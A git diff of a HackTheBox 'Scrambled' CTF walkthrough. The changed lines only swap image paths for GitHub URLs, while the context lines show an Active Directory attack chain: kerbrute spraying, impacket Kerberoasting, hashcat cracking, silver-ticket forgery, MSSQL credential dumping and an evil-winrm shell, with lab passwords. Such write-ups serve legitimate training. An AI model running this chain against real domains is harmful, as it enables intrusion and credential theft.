@@ -1,8 +1,8 @@
-![](scrambled%20logo.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/scrambled%20logo.png)
 
 ## nmap
 ### nmap all ports
-![](Scrambled/screenshots/nmap%20all%20ports.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/nmap%20all%20ports.png)
 
 ### nmap services + versions 
 
@@ -159,7 +159,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 - scrm.local
 
 ## domain reveals potential users
-![](domain.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/domain.png)
 
 ### potential users
 ````
@@ -169,10 +169,10 @@ vbscrub
 `````
 
 ### exiftool on cmd picture reveals potential username
-![](exiftool.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/exiftool.png)
 
 ### username = password
-![](password%20reset%20hint%201.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/password%20reset%20hint%201.png)
 
 ## kerbrute userenum
 ```
@@ -181,7 +181,7 @@ vbscrub
 ```
 
 ### result --> ksimpson valid user
-![](kerbrute%20userenum.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/kerbrute%20userenum.png)
 
 ## kerbrute passwordspray
 ````
@@ -189,10 +189,10 @@ vbscrub
 
 `````
 
-![](Scrambled/screenshots/password%20reset%20hint.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/password%20reset%20hint.png)
 
 ## impacket get TGT
-![](kerberos%20authentication%20overview.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Kerberos/screenshots/kerberos%20authentication%20overview.png)
 
 ### impacket get TGT
 ````
@@ -201,7 +201,7 @@ sudo python3 getTGT.py scrm.local/ksimpson:ksimpson
 `````
 
 ### TGT ticket name = ksimpson.ccache
-![](impacket%20get%20TGT.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/impacket%20get%20TGT.png)
 
 ### export ticket name
 ````
@@ -215,14 +215,14 @@ sudo python3 GetUserSPNs.py -dc-host DC1.scrm.local -no-pass  scrm.local/ksimpso
 
 `````
 
-![](impacket%20get%20users%20SPN.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/impacket%20get%20users%20SPN.png)
 ### hashcat on SPNs hash 
 ````
 ./hashcat.bin ~/Desktop/HackTheBox/Scrambled/usersSPNhash /opt/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
 
 `````
 
-![](hashcat%20cracked%20SPN.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/hashcat%20cracked%20SPN.png)
 Creds so far
 ````
 
@@ -245,13 +245,13 @@ sudo python3 mssqlclient.py DC1.scrm.local -k
 
 `````
 
-![](microsoft%20sql%20server%20login%20attempt.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/microsoft%20sql%20server%20login%20attempt.png)
 
 ### generate NTLM hash of password:Pegasus60
-![](generate%20ntlm%20hash.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/generate%20ntlm%20hash.png)
 
 ### two lowercase cyberchef
-![](ntlm%20lowercase.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/ntlm%20lowercase.png)
 
 ### getting the domain SID
 ````
@@ -259,7 +259,7 @@ python3 getPac.py -targetUser ksimpson scrm.local/ksimpson:ksimpson
 
 `````
 
-![](domain%20SID.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/domain%20SID.png)
 
 ````
 domain SID: S-1-5-21-2743207045-1827831105-2542523200
@@ -274,7 +274,7 @@ export KRB5CCNAME=Administrator.ccache
 
 `````
 
-![](silver%20ticket%20impacket.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/silver%20ticket%20impacket.png)
 
 ### login mssqlclient impacket with new ticket
 ````
@@ -282,14 +282,14 @@ sudo python3 mssqlclient.py DC1.scrm.local -k
 
 `````
 
-![](mssqlclient%20login%20database%20silver%20ticket.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/mssqlclient%20login%20database%20silver%20ticket.png)
 
 ### enumerate mssql database
 ````
 select name from sys.databases;
 
 `````
-![](mssql%20list%20databeses.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/mssql%20list%20databeses.png)
 
 ### mssql list tables
 ````
@@ -297,7 +297,7 @@ select TABLE_NAME from ScrambleHR.INFORMATION_SCHEMA.TABLES;
 
 `````
 
-![](mssql%20list%20table.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/mssql%20list%20table.png)
 
 ### mssql dump table UserImport
 ````
@@ -306,7 +306,7 @@ select * from ScrambleHR.dbo.UserImport;
 
 `````
 
-![](mssql%20dump%20table.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/mssql%20dump%20table.png)
 
  creds
 ````
@@ -320,7 +320,7 @@ sudo python3 getTGT.py scrm.local/MiscSvc:ScrambledEggs9900
 
 `````
 
-![](impacket%20get%20TGT%20MiscSvc.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/impacket%20get%20TGT%20MiscSvc.png)
 
 ### export ticket
 ````bash
@@ -329,7 +329,7 @@ export KRB5CCNAME=MiscSvc.ccache
 `````
 
 /etc/krb5.conf
-![](krb5.conf.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/krb5.conf.png)
 
 ### evil-winrm
 ````
@@ -337,13 +337,13 @@ evil-winrm -r SCRM.LOCAL -i dc1.scrm.local
 
 `````
 
-![](evil-winrm%20shell.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/evil-winrm%20shell.png)
 
 ### user.txt
-![](Scrambled/screenshots/user.txt.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/user.txt.png)
 
 ### download utility not working
-![](powershell%20download%20file.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/powershell%20download%20file.png)
 
 ### download .exe and .dll
 ### impacket smbclient
@@ -361,6 +361,6 @@ get Apps/Sales Order Client/ScrambleLib.dll
 
 `````
 
-![](impacket%20smbclient%20download%20file.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Scrambled/screenshots/impacket%20smbclient%20download%20file.png)
 
 XXXXXXXXX
